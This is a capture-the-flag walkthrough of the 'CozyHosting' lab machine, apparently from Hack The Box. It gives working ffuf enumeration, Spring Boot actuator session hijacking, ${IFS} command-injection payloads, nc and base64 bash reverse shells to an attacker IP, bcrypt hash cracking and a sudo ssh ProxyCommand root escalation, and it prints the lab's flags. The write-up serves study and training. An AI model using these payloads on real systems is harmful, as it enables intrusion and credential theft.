# CozyHosting

## nmap scan 

## Exploration

- go to login page

- double-click in box and see previously entered usernames

- play around with subdirectories and generate whitelabel error page or find with ffuf/gobuster/dirbuster

`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://cozyhosting.htb/FUZZ`

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 84ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 81ms]
index                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 107ms]
login                   [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 73ms]
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 72ms]
render/https://www.google.com [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 270ms]
:: Progress: [4715/4715] :: Job [1/1] :: 293 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

- This indicates spring boot might be in use 

## Bypass authentication with cookie hijacking

`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb/FUZZ`

```

       /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 131ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 143ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 146ms]
actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 170ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 174ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 165ms]
actuator/sessions       [Status: 200, Size: 48, Words: 1, Lines: 1, Duration: 159ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 250ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 187ms]
:: Progress: [112/112] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
- navigate to `actuator/sessions`

- reveals cookie for k.anderson

- paste cookie value in and navigate to /admin for admin portal access

- mess around with ssh connection and we can get interesting output such as SSH usage...it appears parameteres are being passed directly to bash

```
http://cozyhosting.htb/admin?error=usage:%20ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]]
```

## Achieve foothold via shell injection

can't produce output but can we nc to our machine

in the username field:
`;nc${IFS}10.10.14.21${IFS}4444;`

cli output to nc
`;ls${IFS}|${IFS}nc${IFS}10.10.14.21${IFS}4444;`

echo 'bash -i >& /dev/tcp/10.10.14.21/4444 0>&1' | base64

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMS80NDQ0IDA+JjEK

let's try to get a reverse connection
`;nc${IFS}-c${IFS}'bin/sh${IFS}-i${IFS}2>&1'${IFS}10.10.14.21${IFS}4444;`

;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTo0NDQ0IDA+JjEK"${IFS}|${IFS}base64%{IFS}-d${IFS}|${IFS}bash;

;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMS80NDQ0IDA+JjEK"${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;


who's home? 

```
ls /home
josh
```
grab the jar

```
nc shell
python3 -m http.server 9999
```

attacker
```
wget http://cozyip:9999/cloudhosting-0.0.1.jar

jd-gui cloudhosting-0.0.1.jar
```

find postgres creds in BOOT-INF > Classes > static.assets > application.properties

## Get credentials for user Josh

login in to psql 

```
psql -h localhost -U postgres -p 5432
\l
\c cozyhosting
\dt
\d users
select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

copy admin hash and crack with hashcat

```
hashcat --identify '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
The following 3 hash-modes match the structure of your input hash:

      # | Name                                                | Category
  ======+=====================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                        | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                      | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                    | Forums, CMS, E-Commerce
```

```
sudo ./hashcat -m 3200 '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' /usr/share/wordlists/rockyou.txt

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

## Log into SSH as user Josh

```
ssh josh@cozyhosting.htb

cat user.txt
87f8e68fc366698d37229530127257f2
```

## Privesc to Root

```
sudo -l
```

josh can run ssh as root

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

cat root.txt
d2fd53b5157aedbe5ae6e4cc97a79d3f
```




